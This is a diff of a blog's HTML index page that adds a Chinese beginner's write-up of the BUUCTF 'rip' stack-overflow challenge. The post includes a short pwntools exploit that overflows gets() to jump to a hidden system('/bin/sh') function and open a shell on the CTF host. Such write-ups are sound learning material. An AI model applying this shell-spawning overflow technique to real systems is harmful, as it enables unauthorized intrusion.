@@ -214,7 +214,74 @@
             
 
   
-    <article id="post-wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-rip" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h1><p>先照例把所给文件放入ida</p>
+<p>![](&#x2F;images&#x2F;rip&#x2F;屏幕截图 2023-01-15 184744.png)</p>
+<p>发现一个名为fun的函数里有system函数可以进入&#x2F;bin&#x2F;sh</p>
+<p>再看main函数的伪代码（汇编还没学会）</p>
+<p>![](&#x2F;images&#x2F;rip&#x2F;屏幕截图 2023-01-15 184935.png)</p>
+<p>看到get，以目前所学知识，大概率是栈溢出</p>
+<p>再查看栈所在位置</p>
+<p>![](&#x2F;images&#x2F;rip&#x2F;屏幕截图 2023-01-15 185133.png)</p>
+<p>发现需要输入15+8个字节可覆盖到栈</p>
+<p>再查看fun函数入口地址</p>
+<p>![](&#x2F;images&#x2F;rip&#x2F;屏幕截图 2023-01-15 190233.png)</p>
+<p>之前看别人的wp说如果存在内存空间和寄存器之间传输时，128bit(64位)必须要进行对齐（不太懂）</p>
+<p>所以exp</p>
+<p>from pwn import *</p>
+<p>p &#x3D; remote(‘node3.buuoj.cn’,28109)<br>payload &#x3D; b’a’*23+p64(0x401185)+p64(0x401186)<br>p.sendline(payload)<br>p.interactive()</p>
+<p>（自己的删了，上网找了一个跟自己的差不多的）</p>
+<p>然后cat flag</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/01/15/rip/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-test_your_nc" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
   <div class="article-entry" itemprop="articleBody">
@@ -240,7 +307,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2023/01/15/wp/">展开全文 >></a>
+      <a class="article-more-a" href="/2023/01/15/test_your_nc/">展开全文 >></a>
     </p>
     
 
